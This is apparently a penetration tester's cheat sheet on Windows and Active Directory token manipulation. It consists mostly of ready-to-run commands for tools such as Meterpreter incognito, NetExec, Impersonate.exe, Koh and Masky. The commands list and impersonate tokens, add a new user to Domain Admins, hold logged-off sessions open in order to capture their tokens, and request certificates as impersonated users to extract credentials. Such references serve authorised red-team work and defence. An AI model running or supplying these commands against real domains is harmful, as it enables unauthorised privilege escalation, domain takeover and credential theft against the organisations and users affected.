# Token Manipulation

## Tools: Meterpreter , CrackMapExec/Netexec , irs.exe , incognito.exe , masky

#### 1) Meterpreter

 - use incognito

 - impersonate_token DOMAIN\\USER

#### 2) CrackMapExec/Netexec

 - netexec smb IP -u USER -p PASSWORD -M impersonate

#### 3) irs.exe

 - irs.exe list

 - irs.exe exec --pid PID --command COMMAND

#### 4) Incognito.exe

 - .\incognito.exe list_tokens -u

 - ./incognito.exe execute -c "DOMAIN\USER" powershell.exe

### These techniques can give us further privileged ACLs to gain more cleartext credentials or creating persistent mechanisms

## Extract credentials with certificate authentication (ADCS required)

 - masky -d DOMAIN -u USER (-p PASSWORD || -k || -H HASH) -ca CERTIFICATE_AUTHORITY IP

### With this technique, we can perform Lateral movement via NTLM, Kerberos or Certificate.

### List all tokens

##### List all tokens on the machine

    Invoke-TokenManipulation -ShowAll

##### List all unique, usable tokens on the machine

    Invoke-TokenManipulation -Enumerate

### Start a new process with a specific token

##### Token of a user

    Invoke-TokenManipulation -ImpersonateUser -Username "domain\user1"

##### Token of a process

    Invoke-TokenManipulation -CreateProcess "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500

## Token impersonation with command execution and user addition

### List available tokens, and find an interesting token ID

    ./Impersonate.exe list

### With only SeImpersonatePrivilege, if a privileged user's token is present on the machine, it is possible to run code on the domain as him and add a new user in the domain (and add him to the Domain Admins by default):

    ./Impersonate.exe adduser <token_id> user1 Password123 <group_to_add_to> \\dc.domain.local

### With SeImpersonatePrivilege and SeAssignPrimaryToken, if a privileged user's token is presents on the machine, it is possible to execute comands on the machine as him:

    ./Impersonate.exe exec <token_id> <command>

## Token impersonation via session leaking

Basically, as long as a token is linked to a logon session (the ReferenceCount != 0), the logon session can't be closed, even if the user has logged off.
AcquireCredentialsHandle() is used with a session LUID to increase the ReferenceCount and block the session release. Then InitializeSecurityContext() and AcceptSecurityContext() are used to negotiate a new security context, and QuerySecurityContextToken() get an usable token.

### Server

##### List logon session
 
    Koh.exe list

##### Monitor logon session with SID filtering

    Koh.exe monitor <SID>

##### Capture one token per SID found in new logon sessions

    Koh.exe capture

### Client part (only available as Cobalt Strike BOF for the moment)

##### List captured tokens

    koh list

##### List group SIDs for a captured token

    koh groups <LUID>

##### Impersonate a captured token by specifying the session LUID

    koh impersonate <LUID>

##### Release all captured tokens

    koh release all

## Tokens and ADCS

With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.

    .\Masky.exe /ca:<CA_server_FQDN\CA_name> /template:<template_name> /output:./output.txt

# Python

##### List available tokens, and find an interesting token ID

    nxc smb -u user1 -p password -M impersonate -o MODULE=list

##### With only SeImpersonatePrivilege, if a privileged user's token is present on the machine, it is possible to run code on the domain as him and add a new user in the domain (and add him to the Domain Admins by default):

    nxc smb -u user1 -p password -M impersonate -o MODULE=adduser TOKEN=<token_id> CMD="user2 password 'Domain Admins' \\dc.domain.local"

##### With SeImpersonatePrivilege and SeAssignPrimaryToken, if a privileged user's token is present on the machine, it is possible to execute commands on the machine as him:

    nxc smb -u user1 -p password -M impersonate -o MODULE=exec TOKEN=<token_id> CMD=<command>

### Tokens and ADCS

With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.

    masky -d domain.local -u user1 -p <password> -dc-ip <DC_IP> -ca <CA_server_FQDN\CA_name> -o <result_folder> <targets>
